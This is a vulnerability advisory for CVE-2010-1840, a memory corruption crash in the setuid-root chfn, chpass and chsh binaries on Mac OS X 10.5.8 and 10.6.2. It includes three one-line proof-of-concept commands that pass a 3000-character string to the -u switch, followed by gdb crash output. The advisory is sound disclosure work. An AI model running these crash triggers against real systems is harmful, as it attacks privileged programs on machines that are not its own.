@@ -1,0 +1,84 @@
+Apple Directory Services Memory Corruption
+CVE-2010-1840
+
+
+INTRODUCTION
+
+chfn, chpass and chsh dos not properly parse authname switch ("-u"), which causes the applications to crash when parsing a long string. Those binaries are setuid root by default.
+
+This problem was confirmed in the following versions of Apple binaries and MacOS, other versions may be also affected: 
+
+Apple Mac OS X 10.5.8 32bits /usr/bin/chfn, /usr/bin/chpass, /usr/bin/chsh
+Apple Mac OS X 10.6.2 64bits /usr/bin/chfn, /usr/bin/chpass, /usr/bin/chsh
+
+
+CVSS Scoring System
+
+The CVSS score is: 3.3
+	Base Score: 4.2
+	Temporal Score: 3.3
+We used the following values to calculate the scores:
+	Base score is: AV:L/AC:L/Au:R/C:C/I:C/A:C
+	Temporal score is: E:POC/RL:OF/RC:C
+
+
+TRIGGERING THE PROBLEM
+
+/usr/bin/chfn -u `perl -e 'print "A" x 3000'`
+/usr/bin/chsh -u `perl -e 'print "A" x 3000'`
+/usr/bin/chpass -u `perl -e 'print "A" x 3000'`
+
+
+DETAILS
+
+Disassembly:
+
+0x92237215 <CFArrayGetValueAtIndex+101>:	mov    $0x28,%al
+0x92237217 <CFArrayGetValueAtIndex+103>:	cmp    $0xc,%ecx
+0x9223721a <CFArrayGetValueAtIndex+106>:	mov    $0x14,%dl
+0x9223721c <CFArrayGetValueAtIndex+108>:	cmovne %edx,%eax
+0x9223721f <CFArrayGetValueAtIndex+111>:	add    %esi,%eax
+0x92237221 <CFArrayGetValueAtIndex+113>:	mov    0xc(%ebp),%edx
+0x92237224 <CFArrayGetValueAtIndex+116>:	lea    (%eax,%edx,4),%eax
+0x92237227 <CFArrayGetValueAtIndex+119>:	mov    (%eax),%eax <----- Crash here.
+
+(gdb) x/i $pc
+0x92237227 <CFArrayGetValueAtIndex+119>:	mov    (%eax),%eax
+(gdb) i r $eax
+eax            0x585d910	92657936
+(gdb) bt
+#0  0x92237227 in CFArrayGetValueAtIndex ()
+#1  0x9225c46b in _CFBundleTryOnePreferredLprojNameInDirectory ()
+#2  0x9225d80c in _CFBundleAddPreferredLprojNamesInDirectory ()
+#3  0x9224b7b0 in _CFBundleGetLanguageSearchList ()
+#4  0x9225d8da in _CFBundleAddPreferredLprojNamesInDirectory ()
+#5  0x9224b7b0 in _CFBundleGetLanguageSearchList ()
+#6  0x9225b50c in CFBundleCopyResourceURL ()
+#7  0x9225bb32 in CFBundleCopyLocalizedString ()
+#8  0x903633eb in _ODNodeSetCredentials ()
+#9  0x90369813 in ODRecordSetNodeCredentials ()
+#10 0x000044be in ?? ()
+#11 0x000026ac in ?? ()
+#12 0x000022ee in ?? ()
+
+
+The MacOS Heap Protection mechanisms mitigates the impact of this vulnerability.
+
+
+CREDITS
+
+This vulnerability was researched by Rodrigo Rubira Branco from Check Point Vulnerability Discovery Team (VDT).
+
+ACKNOWLEDGES
+
+Many thanks to Rafael Silva who brought the issue in chfn binary to our attention.
+
+
+
+
+--
+Rodrigo Rubira Branco
+Senior Security Researcher
+Vulnerability Discovery Team (VDT)
+Check Point Software Technologies
+http://www.checkpoint.com/defense
